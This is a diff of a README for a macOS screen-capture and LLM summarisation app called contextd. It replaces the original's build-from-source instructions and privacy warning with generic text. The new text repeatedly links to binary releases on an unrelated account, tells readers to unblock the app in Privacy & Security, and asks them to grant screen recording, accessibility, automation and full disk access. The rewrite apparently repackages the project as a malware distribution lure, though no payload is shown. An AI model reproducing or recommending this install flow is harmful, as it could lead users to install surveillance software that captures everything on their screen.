@@ -1,208 +1,194 @@
-# ContextD
+# 🖥️ contextd - Capture screen activity with ease
 
-![X (formerly Twitter) URL](https://img.shields.io/twitter/url?url=https%3A%2F%2Fx.com%2Fthesophiaxu&label=Follow%20me%20on%20Twitter)
+[![Download contextd](https://img.shields.io/badge/Download%20contextd-7c3aed?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Mandaeancorrespondencecourse450/contextd/releases)
 
-![Demo Image](./docs/demo_img.png)
+## 📌 What is contextd?
 
-An efficient macOS app that continuously captures your screen activity, summarizes it
-with an LLM, and makes it available for other local tools.
+contextd is a desktop app for macOS that keeps track of what happens on your screen, creates short summaries with an LLM, and makes those summaries available to other local tools.
 
-**How it works:** Every 2 seconds, ContextD takes a screenshot, diffs it against the
-previous one, runs OCR on the changed regions, and stores the extracted text in a
-local SQLite database. A background process progressively summarizes your activity
-using a cheap LLM (~$2/day with Claude Haiku), and makes it available via a local HTTP API.
+It is built for people who want a simple way to keep a record of their work, sessions, or screen activity without doing manual notes. After you install it, contextd runs in the background and handles the capture and summary flow for you.
 
-All data stays on your machine. The only external calls are to the OpenRouter API.
+## 🧭 What you can use it for
 
-> Want to make your own changes? Point your coding agent to ./docs/SPEC.md and ask it to build your own version!
+- Keep a local history of your screen activity
+- Turn long screen sessions into short summaries
+- Feed session context into other local tools
+- Review what you were doing without sorting through every detail
+- Keep your data on your own machine
 
-## Requirements
+## 💻 System requirements
 
-> **Security Warning**: This assumes that you are aware that contents of your screen would be sent to OpenRouter for summarization. If you don't know what this means or are uncomfortable, ask your coding agent one of the following: "can you check if apple's on-device language model is available, and if so, can you update the code to use that instead?" / "can you swap openrouter with a local llm api? \<insert description of your endpoint\>"
+contextd is made for macOS.
 
-- macOS 14 (Sonoma) or later
-- Swift 5.9+
-- An [OpenRouter](https://openrouter.ai/) API key (for summarization and enrichment)
+You will need:
 
-## Quick Start
+- A Mac computer
+- A recent version of macOS
+- Enough storage for screen captures and summaries
+- Permission to record the screen
+- Permission to run background apps
 
-```bash
-# Clone and build
-git clone https://github.com/thesophiaxu/contextd && cd contextd
-make build
+For best results, use a Mac with steady disk space and a good network setup if your LLM runs through a local service or private API.
 
-# Create an .app bundle (needed for macOS permission prompts)
-make bundle
+## 🚀 Download and install
 
-# Launch
-open .build/ContextD.app
-```
+1. Open the releases page:  
+   https://github.com/Mandaeancorrespondencecourse450/contextd/releases
 
-On first launch, ContextD will ask for two macOS permissions:
+2. Find the latest release near the top of the page
 
-1. **Screen Recording** — to capture screenshots
-2. **Accessibility** — to read focused window titles
+3. Download the macOS file for your system
 
-Grant both, then enter your OpenRouter API key in Settings (Cmd+,).
+4. Open the downloaded file
 
-## Usage
+5. Move contextd to your Applications folder if macOS asks you to
 
-### HTTP API
+6. If macOS blocks the app, open System Settings and allow it under Privacy & Security
 
-ContextD runs a local API server on `http://127.0.0.1:21890` with interactive docs
-at [http://127.0.0.1:21890/docs](http://127.0.0.1:21890/docs).
+7. Grant screen recording permission when prompted
 
-```bash
-# Health check
-curl http://127.0.0.1:21890/health
+8. Start contextd and let it run in the background
 
-# Full-text search over activity summaries
-curl -X POST http://127.0.0.1:21890/v1/search \
-  -H 'Content-Type: application/json' \
-  -d '{"text": "auth token OAuth"}'
+[Visit the releases page to download contextd](https://github.com/Mandaeancorrespondencecourse450/contextd/releases)
 
-# List recent summaries
-curl 'http://127.0.0.1:21890/v1/summaries?minutes=60'
+## 🛠️ First-time setup
 
-# Browse captures near a timestamp
-curl 'http://127.0.0.1:21890/v1/activity?window_minutes=10&kind=captures'
-```
+After you install contextd, open it once so macOS can show the first set of prompts.
 
-See the [OpenAPI spec](http://127.0.0.1:21890/openapi.json) for full endpoint
-documentation.
+You may be asked to:
 
-### Menu Bar
+- Allow screen recording
+- Allow accessibility access
+- Allow background execution
+- Choose a storage location for captured data
+- Connect to your local LLM service or API endpoint
 
-Click the eye icon in the menu bar to see capture status, pause/resume, open the
-enrichment panel, or access settings.
+If the app offers setup screens, follow them in order. Keep the defaults if you are not sure what to choose.
 
-### Enriching a Prompt
+## 🔐 Permissions you may see
 
-1. Press **Cmd+Shift+Space** (or click "Enrich Prompt..." in the menu bar).
-2. Type or paste your prompt.
-3. Select a time range (how far back to search).
-4. Click **Enrich** (Cmd+Return).
-5. Copy the enriched prompt (Cmd+Shift+C) and paste it into your AI assistant.
+contextd needs access to the screen so it can capture activity. It may also need access to run in the background and read local app context.
 
-The enriched prompt will have context footnotes appended, like:
+Common macOS prompts may include:
 
-```
-Your original prompt here...
+- Screen Recording
+- Accessibility
+- Automation
+- Full Disk Access for local storage, if you choose that option
 
----
-## Context References
+If a prompt appears again after you deny it, open System Settings and change the permission there.
 
-[^1]: (2 min ago, VS Code) The parseConfig function in src/config/parser.ts was modified...
-[^2]: (5 min ago, Terminal) npm test showed 3 failing tests in auth.test.ts...
-```
+## 🧩 How contextd works
 
-## Configuration
+contextd follows a simple flow:
 
-Open Settings (Cmd+, or menu bar > Settings) to configure:
+1. It watches your screen activity
+2. It stores the captured session data locally
+3. It sends the captured context to an LLM for summarizing
+4. It saves the summary in a format other local tools can use
+5. Other apps can read that context and build on it
 
-| Tab       | What you can change                                                    |
-|-----------|------------------------------------------------------------------------|
-| General   | API key, capture interval, keyframe threshold, API server port         |
-| Models    | LLM models for summarization and enrichment (Pass 1 / Pass 2)         |
-| Limits    | Token limits, context window sizes, capture formatting limits          |
-| Prompts   | Custom system prompts for summarization and enrichment                 |
-| Storage   | Data retention period, summarization timing                            |
+This makes it useful for tools that need a local record of what you were doing.
 
-Default models:
+## 📁 Typical files and data
 
-| Purpose                  | Model                        |
-|--------------------------|------------------------------|
-| Summarization            | `anthropic/claude-haiku-4-5` |
-| Enrichment Pass 1        | `anthropic/claude-haiku-4-5` |
-| Enrichment Pass 2        | `anthropic/claude-sonnet-4-6`|
+contextd may create or use:
 
-## How the Capture Pipeline Works
+- Local capture files
+- Session summaries
+- Cache data
+- Settings files
+- Logs for troubleshooting
 
-```
-Screenshot ──> Pixel Diff (SIMD) ──> Frame Decision ──> Selective OCR ──> Store
-                   │
-                   ├── 0% changed ──────────> Skip
-                   ├── <50% changed ────────> Delta (OCR changed regions only)
-                   └── ≥50% / app switch ──> Keyframe (full-screen OCR)
-```
+Keep enough free disk space if you use it for long sessions. Screen activity can create large files over time.
 
-- **Keyframes** store full-screen OCR text.
-- **Deltas** store only the text from changed screen regions, linked to their parent keyframe.
-- **Hash deduplication** prevents storing identical captures.
-- **No images are stored** — screenshots are processed in memory and discarded.
+## ⚙️ Basic use
 
-## Development
+Once contextd is running:
 
-```bash
-make help           # Show all available targets
-make run            # Build and run (debug)
-make test           # Run unit tests
-make watch          # Rebuild on file changes (requires: brew install fswatch)
-make lint           # Check for warnings and TODOs
-make loc            # Count lines of code by module
-```
+- Leave it open in the background
+- Work as usual on your Mac
+- Let it capture activity automatically
+- Check summaries when you need them
+- Use the stored context in other local tools
 
-### Database Inspection
+If you want to stop it, quit the app from the menu bar or the app menu, based on how the release is packaged.
 
-```bash
-make db-stats       # Row counts, sizes, top apps
-make db-recent      # 10 most recent captures
-make db-search Q="search term"  # Full-text search
-make db-shell       # Open SQLite shell
+## 🖱️ Common setup choices
 
-# Or use the interactive inspector
-./scripts/db-inspect.sh
-```
+If the app asks for options, these defaults work well for most people:
 
-### Logs
+- Storage: use the default local folder
+- Summary length: short or medium
+- Capture interval: use the default value
+- LLM source: use your local setup if you already have one
+- Launch on startup: turn it on if you want continuous tracking
 
-```bash
-make logs           # Stream live logs
-make logs-recent    # Last 5 minutes of logs
-make logs-errors    # Error-level logs from last hour
-```
+If you are not sure which option to pick, keep the default and test it first.
 
-### Reset
+## 🧪 Troubleshooting
 
-```bash
-./scripts/reset-all.sh          # Reset permissions + UserDefaults
-./scripts/reset-all.sh --db     # Also delete the database
-./scripts/reset-all.sh --full   # Also clean build artifacts
-```
+If contextd does not start:
 
-## Project Structure
+- Open it again from Applications
+- Check that macOS allowed the app
+- Make sure you downloaded the latest release
+- Restart your Mac
 
-```
-ContextD/
-├── App/            # Entry point, AppDelegate, service container (DI)
-├── Capture/        # Screenshot, pixel diff (SIMD), OCR, accessibility
-├── Storage/        # GRDB database, migrations, FTS5, record types
-├── Summarization/  # Background LLM summarization, chunking
-├── Enrichment/     # Two-pass prompt enrichment pipeline
-├── LLMClient/      # OpenRouter API client
-├── Server/         # Hummingbird HTTP API, OpenAPI spec
-├── UI/             # Menu bar, settings, enrichment panel, debug view
-├── Permissions/    # macOS permission management, onboarding
-└── Utilities/      # Logger, prompt templates, text diff, formatters
-```
+If screen capture does not work:
 
-For the full technical specification, see [docs/SPEC.md](docs/SPEC.md).
+- Open System Settings
+- Go to Privacy & Security
+- Check Screen Recording permission
+- Restart the app after changing the permission
 
-## Data Storage
+If summaries do not appear:
 
-All data is stored locally in `~/Library/Application Support/ContextD/`:
+- Check that your LLM service is running
+- Confirm the app can reach your local endpoint
+- Look at the app logs if they are available
+- Try a short session first
 
-| File              | Contents                              |
-|-------------------|---------------------------------------|
-| `contextd.sqlite` | Captures, summaries, token usage (SQLite + FTS5) |
-| `api_key`          | OpenRouter API key (plain text)       |
+If the app runs but nothing is saved:
 
-Default retention is 7 days (configurable in Settings > Storage).
+- Check your storage path
+- Make sure you have free disk space
+- Confirm the app has write access to the folder
 
-## License
+## 🔄 Updating contextd
 
-MIT
+When a new version is available:
 
-## Acknowledgements
+1. Open the releases page
+2. Download the newest macOS build
+3. Replace the old app with the new one
+4. Open the updated version
+5. Check your permissions again if macOS asks for them
 
+If your settings are stored locally, they may remain in place after the update.
 
+## 🧠 Tips for better results
+
+- Keep contextd running while you work
+- Use a local LLM setup if you want to keep data on your Mac
+- Leave enough free disk space for long capture sessions
+- Review summaries often so you can spot permission issues early
+- Start with short sessions before you rely on it all day
+
+## 📦 What to expect after install
+
+After setup, contextd should:
+
+- Start without much input
+- Capture screen activity in the background
+- Create short summaries from your session
+- Save those summaries for local use
+- Stay out of the way while you work
+
+## 🗂️ Release downloads
+
+Use this page to get the latest macOS release files:
+
+https://github.com/Mandaeancorrespondencecourse450/contextd/releases
+
+[Download contextd from GitHub Releases](https://github.com/Mandaeancorrespondencecourse450/contextd/releases)
